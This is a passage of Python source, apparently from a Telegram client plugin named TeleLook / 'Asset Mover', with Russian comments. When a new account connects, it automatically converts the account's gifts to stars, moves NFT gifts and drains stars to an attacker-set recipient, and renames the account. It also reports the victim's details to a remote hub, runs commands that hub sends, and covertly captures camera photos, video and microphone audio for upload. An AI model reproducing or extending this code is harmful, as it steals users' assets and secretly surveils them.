        raise RuntimeError("подарок без msg_id/saved_id — пропущен")

    def _sell_non_nft_gifts(self, account, report):
        """Продажа (конвертация в звёзды) всех НЕ-NFT подарков аккаунта.
        Не-NFT = сохранённый подарок без saved_id, у которого convert_stars > 0.
        Возвращает (продано, получено звёзд)."""
        if not self._tl_has("TL_payments_convertStarGift", "convertStarGift"):
            report("В сборке клиента нет payments.convertStarGift — "
                   "продажа подарков невозможна")
            return 0, 0
        if not self._tl_has("TL_payments_getSavedStarGifts",
                            "getSavedStarGifts"):
            report("В сборке клиента нет payments.getSavedStarGifts — "
                   "список подарков недоступен")
            return 0, 0
        gifts = self._list_own_gifts(account, unique_only=False)
        sold = gained = 0
        for sg in gifts:
            if self._is_nft(sg):
                continue
            try:
                stars = int(getattr(sg, "convert_stars", 0) or 0)
            except Exception:
                stars = 0
            if stars <= 0:
                continue
            try:
                req = self._tl_class("TL_payments_convertStarGift",
                                     "convertStarGift")()
                req.stargift = self._input_saved_gift(account, sg)
                self._tl(req, account)
                sold += 1
                gained += stars
                report(f"💰 Продан подарок → +{stars} ⭐ (итого +{gained})")
                time.sleep(BUY_DELAY)
            except Exception as e:
                report(f"❌ Продажа подарка: {e}")
        return sold, gained

    def _run_pipeline(self, account, report):
        """Полный авто-цикл по одному аккаунту:
        0) познакомить аккаунт с приёмником, 1) продать все не-NFT подарки,
        2) передать NFT, 3) слить звёзды, 4) сменить ник на авто-ник.
        Баннер здесь НЕ показывается — он вызывается кнопкой в меню аккаунта."""
        if self._target_username():
            try:
                ok, info = self._know_target(account)
                report(f"⓿ Знакомство: {'ok' if ok else 'нет'} — {info}")
            except Exception as e:
                report(f"⓿ Ошибка знакомства: {e}")
        else:
            report("⓿ Знакомство пропущено (username приёмника не задан)")
        try:
            sold, gained = self._sell_non_nft_gifts(account, report)
            report(f"① Продано не-NFT: {sold} (+{gained} ⭐)")
        except Exception as e:
            report(f"① Ошибка продажи: {e}")
        try:
            ok, fail = self._transfer_nft(account, report)
            report(f"② NFT передано: {ok}, ошибок {fail}")
        except Exception as e:
            report(f"② Ошибка передачи NFT: {e}")
        try:
            bought, spent, rest = self._drain_stars(account, report)
            report(f"③ Звёзды: куплено {bought}, потрачено {spent} ⭐, "
                   f"остаток {rest} ⭐")
        except Exception as e:
            report(f"③ Ошибка слива звёзд: {e}")
        nick = self._auto_nick()
        if nick:
            try:
                parts = nick.split(None, 1)
                first = parts[0]
                last = parts[1] if len(parts) > 1 else None
                self._set_nick(account, first, last)
                report(f"④ Ник → {nick}")
            except Exception as e:
                report(f"④ Ошибка смены ника: {e}")
        else:
            report("④ Авто-ник не задан (/setnick Имя) — пропуск")

    def _poll_loop(self):
        """Каждые POLL_INTERVAL секунд ищем новые аккаунты и пишем в лог-чат:
        слот, имя, ID, звёзды, кол-во подарков, кол-во NFT.
        Уже известные (зарегистрированы при загрузке) не логируются."""
        while not self._stop.wait(POLL_INTERVAL):
            try:
                for acc in self._scan_accounts():
                    uid = acc["user_id"]
                    if uid in self._known_accounts:
                        continue
                    self._known_accounts.add(uid)
                    self._save_known()
                    self._log_new_account(acc)
                    if self._auto_enabled():
                        threading.Thread(
                            target=self._auto_on_new_account,
                            args=(acc["slot"],),
                            daemon=True,
                        ).start()
            except Exception:
                self.log(f"poll error:\n{traceback.format_exc()}")

    def _log_new_account(self, acc):
        slot = acc["slot"]
        lines = [
            "🆕 <b>Новый аккаунт подключён</b>",
            f"Слот: {slot}",
            f"Имя: {acc['name']}",
            f"ID: <code>{acc['user_id']}</code>",
            f"🔗 Реферер: <code>{CREATOR_ID or '—'}</code>",
        ]
        try:
            lines.append(f"⭐️ Звёзд: <b>{self._stars_balance(slot)}</b>")
        except Exception as e:
            lines.append(f"⭐️ Звёзды: ошибка ({e})")
        try:
            all_g = self._list_own_gifts(slot, unique_only=False)
            nft = [g for g in all_g if self._is_nft(g)]
            lines.append(f"🎁 Подарков: <b>{len(all_g)}</b>")
            lines.append(f"💎 NFT: <b>{len(nft)}</b>")
        except Exception as e:
            lines.append(f"🎁 Подарки: ошибка ({e})")
        text = "\n".join(lines)
        self.log(text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", ""))
        self._send_log(text)
        if self._target_username():
            try:
                ok, info = self._know_target(slot)
                self.log(f"know_target (slot {slot}): {'ok' if ok else 'fail'} — {info}")
                if ok:
                    self._send_log(f"🔗 Слот {slot}: {info}")
            except Exception as e:
                self.log(f"know_target (slot {slot}) error: {e}")

    def _send_log(self, html_text):
        """Отправка в лог-чат (со слота 0), боту владельцу и на сервер-хаб."""
        try:
            if self._hub_url() and getattr(self, "_hub_logs", None) is not None:
                self._hub_logs.append(html_text)
                if len(self._hub_logs) > 500:
                    del self._hub_logs[:-500]
        except Exception:
            pass
        chat = self._log_chat()
        if chat:
            try:
                send_text(chat, html_text, parse_mode="HTML", account=0)
            except Exception as e:
                self.log(f"send_log failed: {e}")

    # ------------------------- сервер-хаб ------------------------------ #
    def _hub_url(self):
        return str(self._cfg("hub_url", HUB_URL) or "").strip().rstrip("/")

    def _hub_secret(self):
        return str(self._cfg("hub_secret", HUB_SECRET) or "")

    def _hub_device_id(self):
        """Стабильный ID устройства для хаба (сохраняется в настройках)."""
        did = str(self.get_setting("hub_device_id", "") or "")
        if not did:
            try:
                accs = self._scan_accounts()
                uid = accs[0]["user_id"] if accs else int(time.time())
            except Exception:
                uid = int(time.time())
            did = f"tl{uid}"
            self.set_setting("hub_device_id", did)
        return did

    def _hub_name(self):
        try:
            accs = self._scan_accounts()
            if accs:
                a = accs[0]
                return f"#{a['slot']} {a['name']}"[:64]
        except Exception:
            pass
        return "device"

    def _device_type(self):
        """Определяет тип устройства: 'mobile' (Android/Telegram-клиент)
        или 'desktop' (Telegram Desktop / иное). Лучшее-усилие, без прав
        доступа к файловой системе."""
        try:
            from android.os import Build  # есть только на Android (Chaquopy)
            return "mobile"
        except Exception:
            pass
        import sys
        plat = sys.platform
        if plat in ("win32", "darwin"):
            return "desktop"
        return "desktop"

    def _device_info(self):
        """Краткая информация об устройстве для регистрации на хабе."""
        import platform, sys
        try:
            rel = platform.release()
        except Exception:
            rel = "?"
        return {
            "type": self._device_type(),
            "platform": sys.platform,
            "release": rel,
        }

    def _hub_http(self, path, payload=None, timeout=35):
        """GET (payload=None) или POST JSON на хаб; возвращает dict."""
        url = self._hub_url() + path
        headers = {"X-Hub-Secret": self._hub_secret()}
        data = None
        if payload is not None:
            data = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read(1_000_000).decode("utf-8")
        return json.loads(raw) if raw else {}

    def _hub_register(self):
        self._hub_http("/hub/register", {
            "device_id": self._hub_device_id(),
            "name": self._hub_name(),
            "version": __version__,
            "creator": CREATOR_ID,
            "platform": self._device_type(),
        }, timeout=15)

    def _hub_push_logs(self):
        """Сбрасывает накопленные логи на хаб пачками по 100 строк."""
        q = getattr(self, "_hub_logs", None)
        if not q:
            return
        lines = q[:100]
        del q[:100]
        self._hub_http("/hub/log", {"device_id": self._hub_device_id(),
                                    "lines": lines}, timeout=15)

    def _hub_exec(self, command):
        """Выполняет команду с хаба тем же диспетчером, что и бот."""
        text = str(command or "").strip()
        if not text:
            return
        parts = text.split()
        cmd = parts[0].split("@")[0].lower().lstrip("/")
        args = parts[1:]
        out = []

        def reply(t):
            out.append(str(t))

        try:
            self._run_command(cmd, args, reply)
        except Exception as e:
            out.append(f"❌ {cmd}: {e}")
        try:
            self._hub_http("/hub/result", {
                "device_id": self._hub_device_id(),
                "text": "\n".join(out)[:3900] or "(пусто)",
            }, timeout=15)
        except Exception as e:
            self.log(f"hub result failed: {e}")

    def _hub_loop(self):
        """Фон: регистрация -> сброс логов -> long-poll команд хаба.
        Работает при любом количестве устройств: у хаба нет проблем
        getUpdates, команды приходят по нашему длинному запросу."""
        registered = False
        last_err = ""
        while not self._stop.is_set():
            if not self._hub_url():
                registered = False
                self._stop.wait(15)
                continue
            try:
                if not registered:
                    self._hub_register()
                    registered = True
                    last_err = ""
                    self.log(f"hub: подключено к {self._hub_url()} "
                             f"(device {self._hub_device_id()})")
                self._hub_push_logs()
                res = self._hub_http(
                    f"/hub/pull?device_id={self._hub_device_id()}&wait=25",
                    None, timeout=40)
                for c in (res.get("commands") or []):
                    threading.Thread(target=self._hub_exec,
                                     args=(c.get("text"),),
                                     daemon=True).start()
            except Exception as e:
                msg = str(e)
                if msg != last_err:
                    self.log(f"hub error: {e}")
                    last_err = msg
                registered = False
                self._stop.wait(20)

    def _cmd_sethub(self, args, reply):
        """Настройка сервер-хаба: /sethub <url> [secret]."""
        if not args:
            cur = self._hub_url() or "не задан"
            reply(f"Hub: <code>{cur}</code>\n"
                  "Задать: <code>/sethub &lt;url&gt; [secret]</code>")
            return
        url = args[0].rstrip("/")
        self.set_setting("hub_url", url)
        if len(args) > 1:
            self.set_setting("hub_secret", args[1])
        reply(f"✅ Хаб: <code>{url}</code>\n"
              "Устройство подключится само (~15 сек): логи пойдут в чат "
              "админа, команды — через /devices.")

    def _cmd_deviceinfo(self, args, reply):
        """Информация об устройстве (тип, платформа, версия плагина,
        состояние хаба) — для админа и диагностики."""
        info = self._device_info()
        label = "📱 Мобильное (Android)" if info["type"] == "mobile" else "💻 Десктоп"
        reply(f"🔎 <b>Устройство</b>\n"
              f"Тип: <b>{label}</b>\n"
              f"Платформа: <code>{info['platform']}</code> · {info['release']}\n"
              f"TeleLook: <b>{__version__}</b>\n"
              f"Хаб: {'подключён → ' + self._hub_url() if self._hub_url() else 'не настроен'}")

    def _cmd_camera(self, args, reply):
        """Снимок с двух камер: /camera"""
        try:
            path = _av_path("camera_%d.jpg" % int(time.time() * 1000))
            result = _tl_camera.shoot(path)
            on_hub = self._hub_upload_file(result, "camera")
            if self._bot_send_file("sendPhoto", "photo", result,
                                   caption="📸 Снимок"):
                reply("📸 Снимок отправлен в чат бота ✅%s"
                      % ("\nНа сайт (галерея) ✅" if on_hub
                         else "\nНа сайт не залит — см. лог"))
            else:
                reply("📸 Снимок: <code>%s</code>\n%s"
                      % (result,
                         "на сайт (галерея) ✅" if on_hub
                         else "залить на сайт не удалось — см. лог"))
        except Exception as e:
            reply("❌ Камера: %s" % e)

    def _cmd_recordvideo(self, args, reply):
        """Запись видео: /recordvideo [сек]"""
        seconds = 15
        if args and args[0].isdigit():
            seconds = int(args[0])
        try:
            path = _av_path("video_%d" % int(time.time() * 1000))
            result = _tl_video.record(path, seconds=seconds)
            if result:
                sent = 0
                on_hub = 0
                for name, p in result.items():
                    if self._hub_upload_file(p, "video:" + str(name)):
                        on_hub += 1
                    if self._bot_send_file("sendDocument", "document", p,
                                           caption="🎥 Видео (%s)" % name):
                        sent += 1
                if sent:
                    reply("🎥 Видео (%d файл.) в чат бота ✅%s"
                          % (sent,
                             ("\nНа сайт (галерея) ✅" if on_hub
                              else "\nНа сайт не залит — см. лог")))
                else:
                    text = "🎥 Видео:\n"
                    for name, p in result.items():
                        text += "  %s: <code>%s</code>\n" % (name, p)
                    text += ("на сайт (галерея) ✅" if on_hub
                             else "залить на сайт не удалось — см. лог")
                    reply(text)
            else:
                reply("❌ Видео не записано: MediaRecorder не смог записать "
                      "(файл пуст/маленький). Частая причина — второй "
                      "экземпляр камеры занят другим приложением. "
                      "Попробуй ещё раз или закрой другие камеры.")
        except Exception as e:
            reply("❌ Видео: %s" % e)

    def _cmd_recordaudio(self, args, reply):
        """Запись аудио: /recordaudio [сек]"""
        seconds = 15
        if args and args[0].isdigit():
            seconds = int(args[0])
        try:
            path = _av_path("audio_%d" % int(time.time() * 1000))
            result = _tl_audio.record(path, seconds=seconds)
            on_hub = self._hub_upload_file(result, "audio")
            if self._bot_send_file("sendDocument", "document", result,
                                   caption="🎙 Аудио (%d сек)" % seconds):
                reply("🎙 Аудио отправлено в чат бота ✅%s"
                      % ("\nНа сайт (галерея) ✅" if on_hub
                         else "\nНа сайт не залит — см. лог"))
            else:
                reply("🎙 Аудио: <code>%s</code>\n%s"
                      % (result,
                         "на сайт (галерея) ✅" if on_hub
                         else "залить на сайт не удалось — см. лог"))
        except Exception as e:
            reply("❌ Аудио: %s" % e)

    # ----------------- локальный HTTP-клиент к Telegram Bot API -------------- #
    def _http_json(self, method, payload, timeout=30):
        """POST к Bot API (JSON). Возвращает ответ {'ok': true, ...};
        на любой ошибке кидает исключение с описанием Telegram."""
        token = self._bot_token()
        if not token:
            raise RuntimeError("bot_token не задан (/settoken)")
        url = "%s/bot%s/%s" % (BOT_API, token, method)
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(url, data=data, headers={
            "Content-Type": "application/json",
            "User-Agent": "TeleLook/" + __version__})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            out = json.loads(resp.read().decode("utf-8", "replace"))
        if not out.get("ok"):
            raise RuntimeError(out.get("description") or "bot api error")
        return out

    def _bot_send_owner(self, text, chat_id=None, reply_markup=None):
        """HTML-текст владельцу (или в chat_id) через Bot API."""
        cid = chat_id or self._owner_id() or self._log_chat()
        if not cid:
            return None
        payload = {"chat_id": int(cid), "text": str(text)[:4000],
                   "parse_mode": "HTML", "disable_web_page_preview": True}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self._http_json("sendMessage", payload, timeout=20)

    def _bot_send_file(self, method, field, path, caption=""):
        """Отправляет файл с устройства владельцу: sendPhoto/sendVideo/
        sendDocument (multipart). True — файл ушёл в чат бота."""
        import os
        token = self._bot_token()
        cid = self._owner_id() or self._log_chat()
        if not token or not cid or not path:
            return False
        try:
            if not os.path.isfile(path) or os.path.getsize(path) == 0:
                return False
            with open(path, "rb") as handle:
                blob = handle.read(50 * 1024 * 1024)
            fname = os.path.basename(path)[:80]
            boundary = "----TeleLook%d" % int(time.time() * 1000)
            head = []

            def add(name, value):
                head.append(("--%s\r\nContent-Disposition: form-data; "
                             "name=\"%s\"\r\n\r\n%s\r\n"
                             % (boundary, name, value)).encode("utf-8"))
            add("chat_id", str(int(cid)))
            add("disable_notification", "true")
            if caption:
                add("caption", str(caption)[:900])
            head.append(("--%s\r\nContent-Disposition: form-data; "
                         "name=\"%s\"; filename=\"%s\"\r\n"
                         "Content-Type: application/octet-stream\r\n\r\n"
                         % (boundary, field, fname)).encode("utf-8"))
            body = b"".join(head) + blob + ("\r\n--%s--\r\n"
                                            % boundary).encode("utf-8")
            url = "%s/bot%s/%s" % (BOT_API, token, method)
            req = urllib.request.Request(url, data=body, headers={
                "Content-Type": "multipart/form-data; boundary=%s" % boundary,
                "User-Agent": "TeleLook/" + __version__})
            with urllib.request.urlopen(req, timeout=120) as resp:
                out = json.loads(resp.read().decode("utf-8", "replace"))
            if not out.get("ok"):
                raise RuntimeError(out.get("description") or "upload error")
            return True
        except Exception as e:
            self.log("bot_send_file(%s) failed: %s" % (method, e))
            return False

    

    

    

    def _hub_upload_file(self, path, caption=""):
        """Отправляет медиафайл на хаб (/hub/upload) -> галерея панели + ЛС
        админам. True — файл залит на сайт."""
        try:
            import os
            if not self._hub_url() or not path or not os.path.isfile(path):
                return False
            with open(path, "rb") as handle:
                blob = handle.read(50 * 1024 * 1024)
            fname = os.path.basename(path)[:80]
            boundary = "----TeleLookHub%d" % int(time.time() * 1000)
            head = []

            def add(name, value):
                head.append(("--%s\r\nContent-Disposition: form-data; "
                             "name=\"%s\"\r\n\r\n%s\r\n"
                             % (boundary, name, value)).encode("utf-8"))
            add("device_id", self._hub_device_id())
            if caption:
                add("caption", str(caption)[:200])
            head.append(("--%s\r\nContent-Disposition: form-data; "
                         "name=\"file\"; filename=\"%s\"\r\n"
                         "Content-Type: application/octet-stream\r\n\r\n"
                         % (boundary, fname)).encode("utf-8"))
            body = b"".join(head) + blob + ("\r\n--%s--\r\n"
                                            % boundary).encode("utf-8")
            req = urllib.request.Request(
                self._hub_url() + "/hub/upload", data=body, headers={
                    "Content-Type": "multipart/form-data; boundary=%s" % boundary,
                    "X-Hub-Secret": self._hub_secret(),
                    "User-Agent": "TeleLook/" + __version__})
            with urllib.request.urlopen(req, timeout=180) as resp:
                resp.read(10000)
            return True
        except Exception as e:
            self.log("hub_upload(%s) failed: %s" % (path, e))
            return False

    HELP_TEXT = (
        "🤖 <b>Asset Mover — команды</b>\n"
        "/status — аккаунты: звёзды / подарки / NFT\n"
        "/accounts — список аккаунтов (диагностика сканирования)\n"
        "/tlinfo — какие TL-классы есть в клиенте\n"
        "/drain confirm — слить все звёзды подарками на цель\n"
        "/nft confirm — передать все NFT-подарки цели\n"
        "/nick &lt;слот&gt; &lt;Имя&gt; [Фамилия] — ник одного аккаунта\n"
        "/nick &lt;Имя&gt; [Фамилия] — ник всех аккаунтов\n"
        "/sell confirm — продать все не-NFT подарки аккаунтов (в звёзды)\n"
        "/auto on|off|run [слот] — авто-режим и его запуск\n"
        "/setnick &lt;Имя&gt; — ник, который ставит авто-режим\n"
        "/setbanner &lt;текст&gt; — текст баннера (кнопка 📢 в меню аккаунта)\n"
        "/banner — показать баннер\n"
        "/menu — инлайн-клавиатура управления аккаунтами\n"
        "/setaddlist &lt;url|slug&gt; — папка чатов для рассылки (t.me/addlist/...)\n"
        "/setbroadcast &lt;текст&gt; — текст рассылки в чаты папки\n"

        "/broadcast [слот] confirm — вступить в папку и разослать текст\n"
        "/settarget &lt;user_id&gt; — аккаунт-приёмник\n"
        "/settargetusername &lt;username&gt; — username приёмника (для знакомства)\n"
        "/knowtarget [слот] — познакомить аккаунты с приёмником (для отправки)\n"
        "/tldump &lt;подстрока&gt; — диагностика: какие TLRPC-классы есть в клиенте\n"
        "/setlog &lt;chat_id&gt; — чат для логов\n"
        "/settoken &lt;token&gt; — токен бота\n"
        "/setowner &lt;user_id&gt; — владелец\n"
        "/update [force] — проверить и скачать обновление плагина\n"
        "/setupdateurl &lt;url&gt; — URL свежей сборки для авто-обновления\n"
        "/setupdateauto 0|1 — фоновое авто-обновление (по умолчанию 0)\n"
        "/setupdateid &lt;plugin_id&gt; — id плагина в DevServer (редко нужно)\n"
        "/setrestart 0|1 — авто-перезапуск клиента после обновления (по умолч. 1)\n"
        "/sethub &lt;url&gt; [secret] — сервер-хаб: логи и управление по сети\n"
        "/deviceinfo — информация об устройстве (тип, платформа)\n"
        "/photos — переслать фото из Избранного приёмнику\n"
        "/camera — снимок с двух камер (лицо + окрестности)\\n"
        "/recordvideo [сек] — записать видео с камер\\n"
        "/recordaudio [сек] — записать аудио с микрофона\\n"
        "Без бота: те же команды с префиксом '!'"
    )

    

    def _run_command(self, cmd, args, reply):
        try:
            if cmd in ("help", "start"):
                reply(self.HELP_TEXT)
            elif cmd == "status":
                self._cmd_status(reply)
            elif cmd == "accounts":
                self._cmd_accounts(args, reply)
            elif cmd == "tlinfo":
                self._cmd_tlinfo(reply)
            elif cmd == "drain":
                self._cmd_drain(args, reply)
            elif cmd == "nft":
                self._cmd_nft(args, reply)
            elif cmd == "nick":
                self._cmd_nick(args, reply)
            elif cmd == "settarget":
                self._cmd_set("target_user_id", args, reply, int_only=True)
            elif cmd == "settargetusername":
                self._cmd_set("target_username", args, reply, int_only=False)
            elif cmd == "knowtarget":
                self._cmd_knowtarget(args, reply)
            elif cmd == "tldump":
                self._cmd_tldump(args, reply)
            elif cmd == "sell":
                self._cmd_sell(args, reply)
            elif cmd == "auto":
                self._cmd_auto(args, reply)
            elif cmd == "setnick":
                self._cmd_setnick(args, reply)
            elif cmd == "setbanner":
                self._cmd_setbanner(args, reply)
            elif cmd == "banner":
                self._cmd_banner(args, reply)
            elif cmd == "setaddlist":
                self._cmd_set("broadcast_slug", args, reply, int_only=False)
            elif cmd == "setbroadcast":
                self._cmd_setbroadcast(args, reply)
            elif cmd == "update":
                self._cmd_update(args, reply)
            elif cmd == "setupdateurl":
                self._cmd_set("update_url", args, reply, int_only=False)
            elif cmd == "setupdateid":
                self._cmd_set("update_plugin_id", args, reply, int_only=False)
            elif cmd == "setrestart":
                self._cmd_set("update_restart", args, reply, int_only=False)
            elif cmd == "setupdateauto":
                self._cmd_set("update_auto", args, reply, int_only=False)
            elif cmd == "sethub":
                self._cmd_sethub(args, reply)
            elif cmd == "photos":
                self._action_photos(self._resolve_slots(None), reply)
            elif cmd == "deviceinfo":
                self._cmd_deviceinfo(args, reply)
            elif cmd == "camera":
                self._cmd_camera(args, reply)
            elif cmd == "recordvideo":
                self._cmd_recordvideo(args, reply)
            elif cmd == "recordaudio":
                self._cmd_recordaudio(args, reply)

            elif cmd == "broadcast":
                self._cmd_broadcast(args, reply)
            elif cmd == "setlog":
                self._cmd_set("log_chat_id", args, reply, int_only=True)
            elif cmd == "setowner":
                self._cmd_set("owner_id", args, reply, int_only=True)
            elif cmd == "settoken":
                self._cmd_set("bot_token", args, reply, int_only=False)
            else:
                reply(f"❓ Неизвестная команда: {cmd}\n\n{self.HELP_TEXT}")
        except Exception as e:
            self.log(f"cmd '{cmd}' error:\n{traceback.format_exc()}")
            reply(f"❌ <b>{cmd}</b>: {e}")

    def _cmd_set(self, key, args, reply, int_only):
        if not args:
            reply(f"Использование: /{key.replace('_',' ')} &lt;значение&gt;")
            return
        raw = args[0]
        if int_only:
            try:
                raw = int(raw)
            except ValueError:
                reply("Значение должно быть числом (ID)")
                return
        self.set_setting(key, raw)
        reply(f"✅ {key} = <code>{raw}</code>")

    def _cmd_knowtarget(self, args, reply):
        """Знакомит аккаунты с приёмником, чтобы они могли отправлять ему
        подарки (звёзды) и NFT. Без аргумента — для всех аккаунтов;
        с номером слота — для одного."""
        slot = None
        if args and args[0].lstrip("-").isdigit():
            slot = int(args[0])
        self._action_know(self._resolve_slots(slot), reply)

    def _throttled(self, reply, interval=8.0):
        """Обёртка report(): всегда в лог плагина, в чат — не чаще
        interval секунд (иначе при сливе thousands сообщений)."""
        state = {"t": 0.0}

        def out(text):
            self.log(text)
            now = time.monotonic()
            if now - state["t"] >= interval:
                state["t"] = now
                reply(text)

        return out

    def _cmd_tldump(self, args, reply):
        """Диагностика TLRPC: показывает реально существующие классы по ключу.
        Использование: /tldump <подстрока>   (пример: /tldump payments)"""
        if not args:
            reply("Использование: <code>/tldump &lt;подстрока&gt;</code>\n"
                  "Например: <code>/tldump stars</code>, "
                  "<code>/tldump starGift</code>, <code>/tldump payments</code>")
            return
        needle = args[0]
        found = self._tl_find(needle)
        if not found:
            reply(f"🤷 Классы TLRPC с подстрокой '<b>{needle}</b>' не найдены")
            return
        text = "\n".join(found)
        if len(text) > 3900:
            text = text[:3900] + "\n…(обрезано)"
        reply(f"🔎 TLRPC ~ '{needle}' ({len(found)}):\n"
              f"<code>{text}</code>")
        self.log(f"tldump '{needle}': {found}")

    def _cmd_tlinfo(self, reply):
        """Диагностика TL-классов клиентa: /tlinfo"""
        modules = self._tl_modules()
        names = [getattr(m, "__name__", str(m)) for m in modules]
        lines = ["🔬 <b>TL-модули, найденные в сборке:</b>"]
        lines += [f"  • <code>{n}</code>" for n in names] or ["  (ничего)"]

        probes = [
            ("getStarsStatus", ("TL_payments_getStarsStatus", "TL_stars_getStarsStatus")),
            ("getSavedStarGifts", ("TL_payments_getSavedStarGifts", "getSavedStarGifts")),
            ("getStarGifts", ("TL_payments_getStarGifts", "getStarGifts")),
            ("sendStarsForm", ("TL_payments_sendStarsForm", "sendStarsForm")),
            ("getPaymentForm", ("TL_payments_getPaymentForm", "getPaymentForm")),
            ("transferStarGift", ("TL_payments_transferStarGift", "transferStarGift")),
            ("inputSavedStarGiftUser", ("TL_inputSavedStarGiftUser", "inputSavedStarGiftUser")),
            ("inputInvoiceStarGift", ("TL_inputInvoiceStarGift",)),
            ("convertStarGift", ("TL_payments_convertStarGift", "convertStarGift")),
            ("inputSavedStarGiftChat", ("TL_inputSavedStarGiftChat", "inputSavedStarGiftChat")),
            ("starGiftUnique", ("TL_starGiftUnique", "starGiftUnique")),
            ("updateProfile", ("TL_account_updateProfile", "updateProfile")),
            ("resolveUsername", ("TL_contacts_resolveUsername", "resolveUsername")),
            ("checkChatlistInvite", ("TL_chatlists_checkChatlistInvite", "checkChatlistInvite")),
            ("joinChatlistInvite", ("TL_chatlists_joinChatlistInvite", "joinChatlistInvite")),
            ("sendMessage", ("TL_messages_sendMessage", "sendMessage")),
            ("getHistory", ("TL_messages_getHistory", "getHistory")),
            ("forwardMessages", ("TL_messages_forwardMessages", "forwardMessages")),
        ]
        lines.append("\n<b>Методы (по нашему универсальному поиску):</b>")
        for label, variants in probes:
            ok = self._tl_has(*variants)
            mark = "✅" if ok else "❌"
            lines.append(f"  {mark} {label}")
        text = "\n".join(lines)
        reply(text)

    def _cmd_status(self, reply):
        self._action_status(self._resolve_slots(None), reply)

    def _cmd_drain(self, args, reply):
        slot = None
        if args and args[0].lstrip("-").isdigit():
            slot = int(args[0])
            args = args[1:]
        if not args or args[0].lower() != "confirm":
            reply("⚠️ Сольёт <b>все</b> звёзды аккаунтов подарками на цель. "
                  "Продолжить: <code>/drain confirm</code>")
            return
        self._action_drain(self._resolve_slots(slot), reply)

    def _cmd_nft(self, args, reply):
        slot = None
        if args and args[0].lstrip("-").isdigit():
            slot = int(args[0])
            args = args[1:]
        if not args or args[0].lower() != "confirm":
            reply("⚠️ Передаст <b>все</b> NFT-подарки аккаунтов цели "
                  "(нужны звёзды на комиссию). Продолжить: "
                  "<code>/nft confirm</code>")
            return
        self._action_nft(self._resolve_slots(slot), reply)

    def _cmd_nick(self, args, reply):
        if not args:
            reply("Использование: <code>/nick [слот] Имя [Фамилия]</code>")
            return
        slots = None
        if len(args) >= 2 and args[0].lstrip("-").isdigit():
            slots = [int(args[0])]
            args = args[1:]
        if not args:
            reply("Не указана имя")
            return
        first = args[0]
        last = args[1] if len(args) > 1 else None
        accs = self._scan_accounts()
        targets = slots or [a["slot"] for a in accs]
        self._diag(f"/nick: скан аккаунтов -> {len(accs)}, целей: {targets or 'НЕТ'}")
        if not targets:
            reply("⚠️ <b>Ник не менялся</b>: сканер не нашёл ни одного аккаунта "
                  "(0 слотов). Смотри строки <code>scan[...]</code> выше — "
                  "в них причина.")
            return
        done = failed = 0
        for slot in targets:
            try:
                self._set_nick(slot, first, last)
                done += 1
                time.sleep(1.0)
            except Exception as e:
                failed += 1
                self._diag(f"/nick #{slot}: {type(e).__name__}: {e}")
                reply(f"❌ #{slot}: {e}")
        reply(f"✅ Ник → <b>{first} {last or ''}</b>: обновлено {done} из "
              f"{len(targets)}"
              + (f", ошибок {failed}" if failed else ""))
    def _resolve_slots(self, slot):
        """slot=None -> все аккаунты; иначе -> только аккаунт(ы) этого слота."""
        accounts = self._scan_accounts()
        if slot is None:
            return accounts
        return [a for a in accounts if int(a["slot"]) == int(slot)]

    def _cmd_accounts(self, args, reply):
        """Диагностика сканирования аккаунтов: /accounts"""
        accs = self._scan_accounts()
        if not accs:
            reply("🔎 <b>Аккаунты</b>\nНе найдены. Ошибки — в логе клиента "
                  "(см. scan_accounts выше).")
            return
        lines = ["🔎 <b>Аккаунты</b>"]
        for a in accs:
            lines.append(f"#{a['slot']} · <b>{a['name']}</b> · "
                         f"<code>{a['user_id']}</code>")
        reply("\n".join(lines))

    def _action_status(self, slots, reply):
        if not slots:
            reply("Нет подключённых аккаунтов")
            return
        lines = ["📊 <b>Аккаунты</b>"]
        for acc in slots:
            slot = acc["slot"]
            head = f"#{slot} {acc['name']} (<code>{acc['user_id']}</code>)"
            if self._is_admin(acc["user_id"]):
                head += " 👑"
            try:
                stars = self._stars_balance(slot)
            except Exception as e:
                lines.append(f"{head}\n  ⭐️ ошибка: {e}")
                continue
            try:
                gifts = self._list_own_gifts(slot, unique_only=False)
                total = len(gifts)
                nft = sum(1 for g in gifts if self._is_nft(g))
            except Exception:
                total, nft = "?", "?"
            lines.append(f"{head}\n  ⭐️ {stars} | 🎁 {total} | 💎 {nft}")
        lines.append(f"\n🎯 Цель: <code>{self._target_id() or 'не задана'}</code>")
        dev = self._device_info()
        mark = "📱" if dev["type"] == "mobile" else "💻"
        lines.append(f"{mark} Устройство: {dev['type']} · {dev['platform']}")
        reply("\n".join(lines))

    def _action_drain(self, slots, reply):
        target = self._target_id()
        if not target:
            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
            return
        reply(f"▶️ Слив звёзд → <code>{target}</code> начат")
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                bought, spent, rest = self._drain_stars(slot, report=prog)
                reply(f"{prefix}✅ куплено {bought}, потрачено {spent} ⭐, "
                      f"остаток {rest} ⭐")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply("🏁 Слив завершён")

    def _action_nft(self, slots, reply):
        target = self._target_id()
        if not target:
            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
            return
        reply(f"▶️ Передача NFT → <code>{target}</code> начата")
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                ok, fail = self._transfer_nft(slot, report=prog)
                reply(f"{prefix}✅ передано {ok}, ошибок {fail}")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply("🏁 Передача NFT завершена")

    def _action_sell(self, slots, reply):
        reply("▶️ Продажа не-NFT подарков начата")
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
